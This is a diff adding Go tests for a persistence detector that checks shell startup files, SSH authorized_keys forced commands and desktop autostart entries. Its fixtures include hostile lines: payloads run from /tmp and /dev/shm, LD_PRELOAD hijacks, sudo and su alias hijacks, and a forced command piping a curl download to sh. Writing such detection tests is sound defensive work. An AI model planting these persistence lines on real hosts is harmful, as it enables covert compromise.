@@ -276,3 +276,81 @@ func TestCommandLineEvasions(t *testing.T) {
 		t.Errorf("LD_PRELOAD's space-separated list: %+v", f)
 	}
 }
+
+// Shell startup files were only checked for download and reverse-shell
+// patterns; the common ways they keep a payload running went unremarked.
+func TestShellStartupLines(t *testing.T) {
+	for line, want := range map[string]string{
+		"nohup /dev/shm/.a >/dev/null 2>&1 &":         "persistence.unusual_path",
+		"(/tmp/.x/miner >/dev/null 2>&1 &)":           "persistence.unusual_path",
+		". /tmp/.x/env.sh":                            "persistence.unusual_path",
+		"export PROMPT_COMMAND='history -a; /tmp/x'":  "persistence.unusual_path",
+		"export LD_PRELOAD=/tmp/.l/x.so":              "persistence.ld_preload",
+		"LD_AUDIT=/usr/lib/a.so; export LD_AUDIT":     "persistence.ld_preload",
+		"alias sudo='/home/u/.config/.s/sudo'":        "persistence.alias_hijack",
+		"alias su=\"python3 /home/u/.cache/su.py\"":   "persistence.alias_hijack",
+		"alias sudo='sudo '":                          "",
+		"alias sudo='nocorrect sudo'":                 "",
+		"alias ssh='TERM=xterm-256color ssh'":         "",
+		"alias ll='ls -alF'":                          "",
+		"[ -f ~/.bash_aliases ] && . ~/.bash_aliases": "",
+		". /etc/bash_completion":                      "",
+		"export PATH=/usr/local/bin:$PATH":            "",
+		"cd /tmp":                                     "",
+	} {
+		fs := judgeShellProfileLine("/home/u/.bashrc", line)
+		if want == "" {
+			if len(fs) != 0 {
+				t.Errorf("%q: unexpected %+v", line, fs)
+			}
+			continue
+		}
+		if !hasRule(fs, want) {
+			t.Errorf("%q: want %s, got %+v", line, want, fs)
+		}
+	}
+	if fs := judgeShellProfileLine("x", "export LD_PRELOAD=/tmp/x.so"); len(fs) == 0 || fs[0].Severity != SevSuspect {
+		t.Errorf("LD_PRELOAD from /tmp should be suspect: %+v", fs)
+	}
+}
+
+// A forced command runs on every login with the key, so it is judged like
+// any other command the account runs.
+func TestSSHForcedCommands(t *testing.T) {
+	keys := parseAuthorizedKeys([]byte(`command="/tmp/.x/r; exec $SHELL",no-port-forwarding ssh-ed25519 AAAAC3Nza a@b
+command="/opt/gitlab/embedded/service/gitlab-shell/bin/gitlab-shell key-1" ssh-rsa AAAAB3Nza git
+command="curl -s http://203.0.113.9/k | sh" ssh-ed25519 AAAAC3Nzb c@d
+ssh-ed25519 AAAAC3Nzc e@f
+`))
+	if keys.Total != 4 || keys.Unrestricted != 1 || len(keys.Commands) != 3 {
+		t.Fatalf("keys: %+v", keys)
+	}
+	if fs := judgeForcedCommand("www-data", keys.Commands[0]); !hasRule(fs, "persistence.ssh_forced_command") {
+		t.Errorf("forced command from /tmp: %+v", fs)
+	}
+	if fs := judgeForcedCommand("git", keys.Commands[1]); len(fs) != 0 {
+		t.Errorf("GitLab's forced command flagged: %+v", fs)
+	}
+	if fs := judgeForcedCommand("svc", keys.Commands[2]); len(fs) == 0 {
+		t.Error("a forced command that pipes a download to a shell went unremarked")
+	}
+}
+
+// Only the [Desktop Entry] group says what an autostart file runs, and a key
+// given twice takes its last value, as GLib reads it. A Hidden=true in an
+// action group, or an early decoy Exec, used to hide the real one.
+func TestDesktopFileGroupsAndRepeats(t *testing.T) {
+	d := parseDesktopFile([]byte("[Desktop Entry]\nType=Application\nExec=/usr/bin/true\nExec=/tmp/.x/run\n" +
+		"[Desktop Action quit]\nExec=/usr/bin/false\nHidden=true\n"))
+	if d.Hidden || d.Exec != "/tmp/.x/run" {
+		t.Fatalf("got %+v", d)
+	}
+	d = parseDesktopFile([]byte("[Desktop Entry]\nHidden=true\nExec=/tmp/x\nHidden=false\n"))
+	if d.Hidden {
+		t.Fatalf("Hidden=false last should leave the entry enabled: %+v", d)
+	}
+	d = parseDesktopFile([]byte("[Desktop Entry]\nExec=/tmp/x\nX-GNOME-Autostart-enabled=false\n"))
+	if !d.Hidden {
+		t.Fatalf("a disabled entry: %+v", d)
+	}
+}
